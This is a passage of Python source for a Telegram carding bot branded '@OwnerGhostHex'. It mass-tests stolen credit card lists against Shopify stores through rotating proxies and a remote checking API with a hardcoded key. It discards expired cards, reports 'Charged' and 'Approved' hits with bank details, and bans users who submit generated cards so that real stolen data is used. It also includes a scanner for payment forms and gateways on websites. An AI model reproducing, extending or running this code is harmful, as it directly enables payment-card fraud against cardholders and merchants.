                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }
                async with session.post(url, json=payload, timeout=10) as resp:
                    await resp.read()
    except Exception as e:
        pass


async def get_formatted_proxy(proxy=None):
    if not proxy:
        saved = await load_proxies()
        if saved:
            proxy = random.choice(saved)
        else:
            return ""
    # Handle user:pass@host:port format (e.g. PureVPN proxies)
    if '@' in proxy:
        try:
            userpass, hostport = proxy.rsplit('@', 1)
            user, passwd = userpass.split(':', 1)
            host, port = hostport.rsplit(':', 1)
            return f"{host}:{port}:{user}:{passwd}"
        except ValueError:
            return proxy
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"{parts[0]}:{parts[1]}:{parts[2]}:{parts[3]}"
    elif len(parts) == 2:
        return f"{parts[0]}:{parts[1]}"
    return proxy


async def check_card(card, site, proxy, session=None, max_price=None):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = await get_formatted_proxy(proxy)
        pool = ACTIVE_API_SERVERS if ACTIVE_API_SERVERS else API_SERVERS
        api_base = random.choice(pool)
        
        import urllib.parse
        params = {'site': site, 'key': "DARKANONSHO!!!", 'cc': card}
        if proxy_str:
            params['proxy'] = proxy_str
        if max_price is not None:
            params['max_price'] = max_price
            
        url = f'{api_base}/shopify?{urllib.parse.urlencode(params)}'
        
        async def fetch(s):
            async with s.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json()
                    return raw
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}

        if session:
            raw = await fetch(session)
        else:
            timeout = aiohttp.ClientTimeout(total=50)
            async with aiohttp.ClientSession(timeout=timeout) as temp_session:
                raw = await fetch(temp_session)
                
        if isinstance(raw, dict) and raw.get('status') == 'Site Error':
            return raw
        if 'error' in raw:
            return {'status': 'Site Error', 'message': raw['error'], 'card': card, 'retry': True}
            
        response_msg = raw.get('Response', raw.get('card_response', ''))
        price = raw.get('Price', raw.get('price', '-'))
        price_value = get_price_from_response(raw)
        if price != '-' and price != 0:
            price_display = f"${price}"
        else:
            price_display = '-'
        gateway = raw.get('Gate', raw.get('Gateway', raw.get('gate', 'Shopify Payments')))

        classification = classify_gate_response(response_msg, raw, gateway=gateway)
        status = classification['status']
        retry = classification['retry']
        
        if is_site_dead(response_msg, gateway, price_display):
            status = 'Site Error'
            retry = True
            
        return {
            'status': status,
            'message': response_msg,
            'card': card,
            'site': site,
            'gateway': gateway,
            'price': price_display,
            'price_value': price_value,
            'retry': retry
        }
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Site Error', 'message': str(e), 'card': card, 'retry': True, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}


async def check_card_with_retry(card, sites, proxies, max_retries=5, session=None, max_price=None):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    result = None
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy, session=session, max_price=max_price)
        if not result.get('retry'):
            return result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5 + attempt * 0.5)  # Increasing backoff
    return {'status': 'Site Error', 'message': f'Max retries exceeded ({result.get("message", "unknown error") if result else "unknown"})', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0, 'retry': True}


async def test_site_with_price(site, proxy, _retries=2):
    original_site = site
    if not site.startswith('http'):
        site = f'https://{site}'
        
    for attempt in range(_retries):
        try:
            proxy_str = await get_formatted_proxy(proxy)
            pool = ACTIVE_API_SERVERS if ACTIVE_API_SERVERS else API_SERVERS
            api_base = random.choice(pool)
            
            import urllib.parse
            api_key = "DARKANONSHO!!!" if "1e5c" in api_base else CHECKER_API_KEY
            params = {'site': site, 'key': api_key}
            if proxy_str:
                params['proxy'] = proxy_str
            url = f'{api_base}/check?{urllib.parse.urlencode(params)}'
            
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        if attempt < _retries - 1:
                            proxies_list = await load_proxies()
                            if proxies_list:
                                proxy = random.choice(proxies_list)
                            await asyncio.sleep(0.5)
                            continue
                        return {'site': original_site, 'status': 'dead', 'price': 0.0}
                    try:
                        raw = await resp.json()
                    except Exception:
                        if attempt < _retries - 1:
                            proxies_list = await load_proxies()
                            if proxies_list:
                                proxy = random.choice(proxies_list)
                            await asyncio.sleep(0.5)
                            continue
                        return {'site': original_site, 'status': 'dead', 'price': 0.0}

            # Check valid boolean from /check API response
            valid = raw.get('valid')
            if valid is True:
                response_msg = raw.get('card_response', raw.get('Response', ''))
                gateway = raw.get('gate', raw.get('Gate', 'Shopify Payments'))
                price_display = raw.get('price', raw.get('Price', '-'))
                if is_site_dead(response_msg, gateway, price_display):
                    return {'site': original_site, 'status': 'dead', 'price': 0.0}
                price_value = get_price_from_response(raw)
                return {'site': original_site, 'status': 'alive', 'price': price_value}
            elif valid is False:
                reason = raw.get('reason', '')
                if reason in ('DEAD_SITE', 'NO_CHEAP_PRODUCTS', 'INVALID_SITE'):
                    return {'site': original_site, 'status': 'dead', 'price': 0.0}
                if reason in ('THROTTLED', 'Timeout'):
                    return {'site': original_site, 'status': 'alive', 'price': 0.0}
                return {'site': original_site, 'status': 'dead', 'price': 0.0}
            else:
                response_msg = raw.get('card_response', raw.get('Response', ''))
                gateway = raw.get('gate', raw.get('Gate', 'Shopify Payments'))
                price_display = raw.get('price', raw.get('Price', '-'))
                if is_site_dead(response_msg, gateway, price_display):
                    return {'site': original_site, 'status': 'dead', 'price': 0.0}
                price_value = get_price_from_response(raw)
                return {'site': original_site, 'status': 'alive', 'price': price_value}
                
        except Exception as e:
            if attempt < _retries - 1:
                proxies_list = await load_proxies()
                if proxies_list:
                    proxy = random.choice(proxies_list)
                await asyncio.sleep(0.5)
                continue
            return {'site': original_site, 'status': 'dead', 'price': 0.0}

    return {'site': original_site, 'status': 'dead', 'price': 0.0}


def parse_proxy_line(line: str) -> Optional[str]:
    """Universal proxy line parser supporting all standard formats."""
    if not line:
        return None
    # Strip numbering (e.g. "1. ", "1) ", "1- ") - requires whitespace to not corrupt IP addresses
    line = re.sub(r'^\d+[\.\)\-]\s+', '', line.strip()).strip()
    # Strip protocols
    line = re.sub(r'^(http|https|socks4|socks5)://', '', line, flags=re.IGNORECASE).strip()
    # Strip trailing punctuation
    line = line.strip('"\',()[]{} \t\r\n')
    if not line:
        return None
        
    # user:pass@host:port or host:port@user:pass
    if '@' in line:
        parts = line.split('@')
        if len(parts) == 2:
            left, right = parts[0], parts[1]
            if ':' in left and ':' in right:
                # user:pass@host:port
                return f"{left}@{right}"
            elif ':' in right:
                return line
        return line
        
    parts = line.split(':')
    if len(parts) == 4:
        if parts[1].isdigit() and 1 <= int(parts[1]) <= 65535:
            return f"{parts[0]}:{parts[1]}:{parts[2]}:{parts[3]}"
        elif parts[3].isdigit() and 1 <= int(parts[3]) <= 65535:
            return f"{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"{parts[0]}:{parts[1]}:{parts[2]}:{parts[3]}"
    elif len(parts) == 2:
        if parts[1].isdigit() and 1 <= int(parts[1]) <= 65535:
            return f"{parts[0]}:{parts[1]}"
            
    return None

async def test_proxy(proxy):
    try:
        parsed = parse_proxy_line(proxy)
        if not parsed:
            return {'proxy': proxy, 'status': 'dead'}
            
        proxy_clean = parsed
        if '@' in proxy_clean:
            proxy_url = f'http://{proxy_clean}'
        else:
            proxy_parts = proxy_clean.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_url = f'http://{user}:{password}@{ip}:{port}'
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_url = f'http://{ip}:{port}'
            else:
                proxy_url = f'http://{proxy_clean}'
                
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://ip-api.com/json', proxy=proxy_url) as res:
                if res.status == 200:
                    return {'proxy': proxy_clean, 'status': 'alive'}
                else:
                    return {'proxy': proxy_clean, 'status': 'dead'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

async def send_realtime_hit(user_id, result, hit_type, username):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    if hit_type == "Charged":
        status_text = "CHARGED"
        emoji = "💎"
    else:
        status_text = "APPROVED"
        emoji = "✅"
    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}"""
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass


async def update_progress(chat_id, user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    total = results['total']
    checked = results['checked']
    remaining = total - checked

    percentage = int((checked / total) * 100) if total > 0 else 0

    bar_length = 16
    filled = int(bar_length * checked / total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_length - filled)

    progress_text = f"""💳 Cᴀʀᴅ: <code>{results.get('last_card', 'None')[:16]}</code>
📝 {results.get('last_response', 'Waiting...')[:35]}
💰 {str(results.get('last_price') or '-')[:7]}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
{bar}
❌ Dᴇᴄʟɪɴᴇᴅ: {len(results.get('dead', []))}
📊 {checked}/{total} ({percentage}%) | Rᴇᴍᴀɪɴɪɴɢ: {remaining}
⏱️ {hours:02d}:{minutes:02d}:{seconds:02d}
"""
    buttons = [
        [Button.inline(f" Cʜᴀʀɢᴇᴅ {len(results['charged'])}", f"shopify_export_charged:{user_id}".encode(
        ), style="success", icon=5444987348334965906)],
        [Button.inline(f" Aᴘᴘʀᴏᴠᴇᴅ {len(results['approved'])}", f"shopify_export_approved:{user_id}".encode(
        ), style="primary", icon=5343636681473935403)],
        [Button.inline(f" Eʀʀᴏʀs {len(results.get('errors', []))}", f"shopify_export_errors:{user_id}".encode(
        ), style="danger", icon=4915853119839011973)],
        [Button.inline(" Sᴛᴏᴘ", f"stop_{user_id}".encode(
        ), style="danger", icon=4915890090917495591)]
    ]
    try:
        await bot.edit_message(chat_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass


async def send_final_results(user_id, chat_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "Nᴏ ʜɪᴛs ғᴏᴜɴᴅ"
    gateway = results['charged'][0]['gateway'] if results['charged'] else (
        results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    errors_count = len(results.get('errors', []))

    summary = f"""✅ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ! ✅

📊 Rᴇsᴜʟᴛs:
   ┣ ✅ Cʜᴀʀɢᴇᴅ: {len(results['charged'])}
   ┣ 🔥 Aᴘᴘʀᴏᴠᴇᴅ: {len(results['approved'])}
   ┣ ❌ Dᴇᴄʟɪɴᴇᴅ: {len(results['dead'])}
   ┣ ⚠️ Eʀʀᴏʀs: {errors_count}
   ┗ 📊 Tᴏᴛᴀʟ: {results['total']}

Hɪᴛs:
{hits_text}

💡 Mᴀᴅᴇ ʙʏ @OwnerGhostHex"""

    buttons = []
    if results['charged']:
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Cʜᴀʀɢᴇᴅ ({len(results['charged'])})", f"shopify_export_charged:{user_id}".encode(
        ), style="success", icon=5343636681473935403)])
    if results['approved']:
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Aᴘᴘʀᴏᴠᴇᴅ ({len(results['approved'])})", f"shopify_export_approved:{user_id}".encode(
        ), style="primary", icon=5123248930124989216)])
    if results.get('errors'):
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Eʀʀᴏʀs ({errors_count})", f"shopify_export_errors:{user_id}".encode(
        ), style="danger", icon=4915853119839011973)])

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ghost{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        await f.write(f"CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"DECLINED ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"ERRORS ({len(results.get('errors', []))}):\n")
        for r in results.get('errors', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")

    await bot.send_message(chat_id, premium_emoji(summary), file=filename, buttons=buttons if buttons else None, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass


async def process_file_with_filters(event, user_id):
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ ᴏʀ ᴀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ CCs."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    
    file_path = None
    if reply_msg.file and reply_msg.file.name and reply_msg.file.name.endswith('.txt'):
        file_path = await reply_msg.download_media()
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
        except Exception as e:
            if file_path and os.path.exists(file_path):
                os.remove(file_path)
            await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ ʀᴇᴀᴅɪɴɢ ғɪʟᴇ: {e}"), parse_mode='html')
            return
    elif reply_msg.text:
        content = reply_msg.text
        import time
        file_path = f"temp_text_{user_id}_{int(time.time())}.txt"
        async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
            await f.write(content)
    else:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ ᴏʀ ᴀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ CCs."), parse_mode='html')
        return

    try:
        raw_cards = extract_cc(content)
        if not raw_cards:
            await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ."), parse_mode='html')
            os.remove(file_path)
            return

        # Deduplicate while preserving order
        deduped_cards = list(dict.fromkeys(raw_cards))

        # Auto-clean expired cards
        current_year = datetime.now().year
        current_month = datetime.now().month
        valid_cards = []
        for card in deduped_cards:
            parts = card.split('|')
            if len(parts) >= 3:
                cc, mm, yy = parts[0], parts[1], parts[2]
                try:
                    card_year = int(yy)
                    card_month = int(mm)
                    if card_year < 100:
                        card_year += 2000
                    if card_year > current_year or (card_year == current_year and card_month >= current_month):
                        valid_cards.append(card)
                except:
                    valid_cards.append(card)
            else:
                valid_cards.append(card)

        if not valid_cards:
            await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ/ᴜɴᴇxᴘɪʀᴇᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ ᴀғᴛᴇʀ ᴄʟᴇᴀɴɪɴɢ."), parse_mode='html')
            os.remove(file_path)
            return

        # Anti-Gen Detection
        if len(valid_cards) >= 500 and user_id not in ADMIN_ID and not await db_manager.is_adm_premium(user_id):
            from collections import Counter
            bins = []
            for c in valid_cards:
                parts = c.split('|')
                if len(parts) >= 1 and len(parts[0]) >= 6:
                    bins.append(parts[0][:6])
            if bins:
                most_common, count = Counter(bins).most_common(1)[0]
                if count / len(valid_cards) >= 0.80:
                    await db_manager.ban_user(user_id, reason=f"Anti-Gen (BIN {bins[0]})")
                    await event.reply(premium_emoji(f"🚨 <b>Aɴᴛɪ-Gᴇɴ Bᴀɴ</b>\n\n⚠️ Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴘᴇʀᴍᴀɴᴇɴᴛʟʏ ʙᴀɴɴᴇᴅ ғᴏʀ ᴄʜᴇᴄᴋɪɴɢ ɢᴇɴᴇʀᴀᴛᴇᴅ ᴄᴀʀᴅs.\n📊 Dᴇᴛᴀɪʟs: {count} / {len(valid_cards)} ᴄᴀʀᴅs sʜᴀʀᴇᴅ ᴛʜᴇ sᴀᴍᴇ BIN"), parse_mode='html')
                    if os.path.exists(file_path):
                        try:
                            os.remove(file_path)
                        except:
                            pass
                    return

        # Get user plan for file limits
        stats = await db_manager.get_user_stats(user_id)
        plan_key = stats.get('plan', 'junior')
        plan_config = PLANS.get(plan_key, PLANS['junior'])
        max_cards = plan_config['cards_per_file']
        
        # Override with custom limit if set
        custom_limit = stats.get('custom_limit')
        if custom_limit is not None:
            max_cards = custom_limit
        
        # Enforce limits
        if user_id not in ADMIN_ID and len(valid_cards) > max_cards:
            TEMP_FILE_DATA[f"{user_id}_overlimit"] = {
                'cards': valid_cards,
                'file_path': file_path,
                'max_cards': max_cards
            }
            overlimit_buttons = [
                [Button.inline(f"✅ Cʜᴇᴄᴋ ғɪʀsᴛ {max_cards:,}", f"chk_trunc:{max_cards}:{user_id}".encode(), style="primary", icon=5348503265967355284)],
                [Button.inline(f"✂️ Sᴘʟɪᴛ ɪɴᴛᴏ {max_cards:,} ᴇᴀᴄʜ", f"chk_split:{max_cards}:{user_id}".encode(), style="success", icon=5444931419270839381)],
                [Button.inline("  Cᴀɴᴄᴇʟ", f"chk_overlimit_cancel:{user_id}".encode(), style="danger", icon=4915853119839011973)]
            ]
            await event.reply(
                premium_emoji(f"⚠️ <b>Fɪʟᴇ Exᴄᴇᴇᴅs Pʟᴀɴ Lɪᴍɪᴛ!</b>\n\n📊 Yᴏᴜʀ ғɪʟᴇ: <b>{len(valid_cards):,}</b> ᴠᴀʟɪᴅ ᴄᴀʀᴅs\n👑 Yᴏᴜʀ ʟɪᴍɪᴛ: <b>{max_cards:,}</b> ᴄᴀʀᴅs ᴘᴇʀ ᴄʜᴇᴄᴋ\n\n🔽 Wʜᴀᴛ ᴡᴏᴜʟᴅ ʏᴏᴜ ʟɪᴋᴇ ᴛᴏ ᴅᴏ?"),
                buttons=overlimit_buttons,
                parse_mode='html'
            )
            return
        else:
            cards = valid_cards

        TEMP_FILE_DATA[user_id] = {'cards': cards, 'file_path': file_path}
        
        # Show price filter selection before starting
        filters = await load_price_filters()
        gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
        buttons = []
        row = []
        for i, f in enumerate(gateway_filters):
            row.append(Button.inline(f["name"], f"price_fltr:{i}:{user_id}".encode()))
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        buttons.append([Button.inline("  Cᴀɴᴄᴇʟ", b"cancel_filter")])
        await event.reply(
            premium_emoji(
                f"📁 Fɪʟᴇ ʟᴏᴀᴅᴇᴅ: \u003cb\u003e{len(cards):,}\u003c/b\u003e ᴄᴀʀᴅs ғᴏᴜɴᴅ!\n\n💰 Sᴇʟᴇᴄᴛ ᴀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ:"),
            buttons=buttons,
            parse_mode='html'
        )
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)


async def start_mass_check(user_id, cards, sites, event, max_price=None):
    if user_id in active_user_checks and user_id not in ADMIN_ID:
        try:
            await safe_edit(event, premium_emoji("❌ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀ ᴍᴀss-ᴄʜᴇᴄᴋ ʀᴜɴɴɪɴɢ! Pʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ɪᴛ ᴛᴏ ғɪɴɪsʜ ᴏʀ ᴜsᴇ /stop."), parse_mode='html')
        except:
            await event.reply(premium_emoji("❌ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀ ᴍᴀss-ᴄʜᴇᴄᴋ ʀᴜɴɴɪɴɢ! Pʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ɪᴛ ᴛᴏ ғɪɴɪsʜ ᴏʀ ᴜsᴇ /stop."), parse_mode='html')
        return
    if user_id not in ADMIN_ID:
        active_user_checks.add(user_id)
        
    if not sites:
        if user_id in active_user_checks:
            active_user_checks.remove(user_id)
        try:
            await safe_edit(event, premium_emoji("❌ Nᴏ sɪᴛᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!"), parse_mode='html')
        except:
            await event.reply(premium_emoji("❌ Nᴏ sɪᴛᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!"), parse_mode='html')
        return
    proxies = await load_proxies(user_id)
    if not proxies:
        msg_text = "❌ <b>Nᴏ ᴘʀᴏxɪᴇs ғᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ᴘᴏᴏʟ!</b>\n\nPʟᴇᴀsᴇ ᴀᴅᴅ ᴘʀᴏxɪᴇs ᴜsɪɴɢ <code>/addproxy</code> ʙᴇғᴏʀᴇ ᴄʜᴇᴄᴋɪɴɢ."
        try:
            await safe_edit(event, premium_emoji(msg_text), parse_mode='html')
        except:
            await event.reply(premium_emoji(msg_text), parse_mode='html')
        return
    try:
        status_msg = await safe_edit(event, premium_emoji(f"🔥 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ғᴏʀ {len(cards)} ᴄᴀʀᴅs..."), parse_mode='html')
    except:
        status_msg = await event.reply(premium_emoji(f"🔥 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ғᴏʀ {len(cards)} ᴄᴀʀᴅs..."), parse_mode='html')
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    all_results = {
        'charged': [], 'approved': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0,
        'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Unknown'
    }
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]
        proxy_list = await load_proxies(user_id)
        api_count = len(ACTIVE_API_SERVERS) if ACTIVE_API_SERVERS else len(API_SERVERS)
        # With 6 APIs × 5 replicas (30 workers) and 44 proxies,
        # we can push high concurrency. Scale with proxy count × API count.
        max_threads = min(len(proxy_list) * api_count, 300) if proxy_list else 20
        api_sem = asyncio.Semaphore(max_threads)
        card_retries = {}
        api_index = [0]  # Round-robin counter for even API distribution

        async def worker(shared_session):
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(2)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                if not sites or not proxy_list:
                    break
                async with api_sem:
                    res = await check_card_with_retry(card, sites, proxy_list, max_retries=5, session=shared_session, max_price=max_price)
                if res.get('retry', False) or res.get('status') == 'Site Error':
                    msg = (res.get('message') or '').upper()
                    attempts = card_retries.get(card, 0) + 1
                    if 'THROTTLED' in msg or 'NO_PRODUCT' in msg:
                        # Back off and retry on a different site/proxy
                        await asyncio.sleep(2.0 + attempts * 1.0)
                    elif 'TIMEOUT' in msg or 'NO_SESSION_TOKEN' in msg:
                        await asyncio.sleep(2.0)
                    else:
                        await asyncio.sleep(0.5)
                    
                    if attempts <= 6:
                        card_retries[card] = attempts
                        queue.put_nowait(card)
                        queue.task_done()
                        continue
                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_response'] = (res.get('message') or '')[:50]
                all_results['last_price'] = res.get('price', '-')
                all_results['last_gateway'] = res.get('gateway', 'Unknown')
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', username)
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', username)
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
                elif res['status'] == 'Dead':
                    all_results['dead'].append(res)
                else:
                    if 'errors' not in all_results:
                        all_results['errors'] = []
                    all_results['errors'].append(res)
                queue.task_done()
                            
        timeout = aiohttp.ClientTimeout(total=45)
        connector = aiohttp.TCPConnector(limit=500, enable_cleanup_closed=True, ttl_dns_cache=300, use_dns_cache=True)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as shared_session:
            workers = [asyncio.create_task(worker(shared_session)) for _ in range(max_threads)]
            last_ui_update = time.time()
            while workers:
                if session_key not in active_sessions:
                    for w in workers:
                        if not w.done():
                            w.cancel()
                    break
                done, pending = await asyncio.wait(workers, timeout=1.0)
                workers = list(pending)
                
                now = time.time()
                if now - last_ui_update >= 3.5:
                    last_ui_update = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(event.chat_id, user_id, status_msg.id, all_results, all_results['checked'])
                        except:
                            pass
            if session_key in active_sessions:
                await update_progress(event.chat_id, user_id, status_msg.id, all_results, all_results['checked'])
    except Exception as e:
        await bot.send_message(event.chat_id, premium_emoji(f"❌ Aɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {e}"), parse_mode='html')
    finally:
        if user_id in active_user_checks:
            active_user_checks.remove(user_id)
        if session_key in active_sessions:
            del active_sessions[session_key]

        if user_id in TEMP_FILE_DATA:
            file_data = TEMP_FILE_DATA.pop(user_id, None)
            if file_data and 'file_path' in file_data:
                fp = file_data['file_path']
                if fp and os.path.exists(fp):
                    try:
                        os.remove(fp)
                    except:
                        pass

        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, event.chat_id, all_results)
        try:
            await db_manager.log_check_session(
                user_id, all_results['total'],
                len(all_results.get('charged', [])),
                len(all_results.get('approved', [])),
                len(all_results.get('dead', [])),
                len(all_results.get('errors', []))
            )
        except:
            pass
        SHOPIFY_SESSION_RESULTS[user_id] = all_results
        await asyncio.sleep(300)
        SHOPIFY_SESSION_RESULTS.pop(user_id, None)


CARD_FORM_PATTERNS = [
    re.compile(
        r'name\s*=\s*["\'](?:cardnumber|card_number|ccnumber|cc-number|card-num)["\']', re.I),
    re.compile(
        r'id\s*=\s*["\'](?:cardnumber|card_number|ccnumber|cc-number|card-num)["\']', re.I),
    re.compile(
        r'placeholder\s*=\s*["\'](?:Card Number|Credit Card|Card No)["\']', re.I),
    re.compile(
        r'name\s*=\s*["\'](?:cvv|cvv2|cvc|security_code|card_cvc|card-cvc)["\']', re.I),
    re.compile(
        r'name\s*=\s*["\'](?:expiry|expdate|exp_date|cc-exp|exp-month|exp-year)["\']', re.I),
    re.compile(
        r'name\s*=\s*["\'](?:billing|payment_method_nonce|credit_card)["\']', re.I),
    re.compile(r'data-(?:stripe|braintree|square|card)[\w-]*=\s*["\']', re.I),
    re.compile(r'Stripe\(|braintree\.dropin|sqpaymentform', re.I),
]


def _scripts(html: str) -> list[str]:
    return re.findall(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)


def _in(text: str, *patterns: str) -> bool:
    t = text.lower()
    for p in patterns:
        if p.lower() in t:
            return True
    return False


def has_card_form(html: str) -> bool:
    for p in CARD_FORM_PATTERNS:
        if p.search(html):
            return True
    return False


def detect_gateways(html: str) -> list[str]:
    found = []
    srcs = _scripts(html)
    h = html.lower()

    # Stripe
    for s in srcs:
        if "js.stripe.com" in s.lower():
            found.append("Stripe")
            break
    if not found and (re.search(r'pk_live_|pk_test_', html) or "stripe.com" in h):
        found.append("Stripe")

    # PayPal
    for s in srcs:
        if "paypal.com/sdk" in s.lower() or "paypalobjects.com" in s.lower():
            found.append("PayPal")
            break
    if not found and ("paypal.com" in h or "data-paypal-button" in h):
        found.append("PayPal")

    # Shopify
    for s in srcs:
        if "myshopify.com" in s.lower() or "cdn.shopify.com" in s.lower():
            found.append("Shopify")
            break
    if not found and ("shopify.com" in h or "shopify_pay" in h):
        found.append("Shopify")

    # Braintree
    for s in srcs:
        if "braintreegateway.com" in s.lower() or "braintree.js" in s.lower():
            found.append("Braintree")
